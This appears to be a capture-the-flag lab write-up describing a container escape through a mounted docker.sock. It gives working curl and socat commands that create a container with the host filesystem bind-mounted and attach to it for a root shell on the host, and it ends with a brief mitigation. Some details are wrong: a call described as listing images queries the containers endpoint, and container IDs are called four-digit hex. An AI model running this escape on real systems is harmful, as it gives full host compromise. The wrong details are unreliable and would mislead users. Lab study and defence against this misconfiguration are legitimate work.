# via-docker-socket

## briefing

Encountered a docker container which had the `docker.sock` included in the mounted volumes. This allowed for escape of the counter by interacting with the socket via `curl` requests. 

- lab environment:
	- [https://tryhackme.com/room/linuxagency](https://tryhackme.com/room/linuxagency)
- Procedure was created by studying this blog:
	- [https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html](https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html)


## procedure

> throughout this section, edit the `~/path/to/docker.sock` as needed.

### preparations

We need two things prepared:

1. we should escalate to the root user within the container we are trapped in
2. we need to serve a statically linked copy of `socat` to our target
3. we need to know what docker images are available on the target in order to prepapre the `containers.json` file. If the target has internet access, alpine is a nice image to pull down due to its small size

If our user does not have access to the docker binary to run `docker images`, we may still have permission to interact with the docker api directly via `curl`. 

The following lists available images. 

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Pick an available image, in our case `mangoman`, and prepare the `container.json` file.

```bash
echo -e '{"Image":"mangoman","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}' > container.json
```

Take note of the mounts in the above command, these can be modified to include the root file system. e.g. `"Source":"/", "Target":"/pwned"`. With access to the root file system of the host, arbitrary read/write is possible, therefore full compromise is achieved.


### start our malicious container

We can create a container based off of our `container.json` with:

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
```

The above command yields a response on stdout from the docker daemon. The response has the **four digit hex docker id** of the container we created. This id is needed for the remaining steps.

At this point, the container is **not running yet**. We can start it using the docker id by:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/4_DIGIT_DOCKER_ID_FROM_ABOVE/start
```

Note that the above command produces **no output on the terminal**.


### request shell from docker socket 

With our container running, we can now request a shell via the docker api by interacting with the `docker.sock` using `socat`. Any tool that allows manual crafting of HTTP headers will work, `socat` is used for reliability.


Open a connection using `socat`: 

```bash
./socat - UNIX-CONNECT:/var/run/docker.sock
```

Now we can modify HTTP header manually. I recommend preparing the following payload, then copy pasting it into the terminal.

```bash
POST /containers/4_DIGIT_DOCKER_ID_FROM_ABOVE/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp


```

Note the following

- the two line breaks in the above are necessary to make the HTTP request valid
- the `4_DIGIT_DOCKER_ID_FROM_ABOVE` must be replaced 

Returns a root shell to us! We are root user of our custom container. Our custom contianer has the host file system mounted on it. Thus, we have full control of the host.


## conclusion

The procedure detailed here is not an exhaustive description of what is possible from this misconfiguration. In general, if it can be done through the docker API then it can be done through similar methods as detailed above. This makes sense, as the `docker.sock` is pointed at localhost, which is within the "walled garden" and not subject to robust security standards. This escape vector can be eliminated by ensuring that the `docker.sock` is never accidentally mounted when containers are deployed. A redudancy measure could be implemented that uses the `find` command in all perspecitve mounts and halts container deployment in the event of `docker.sock` being present.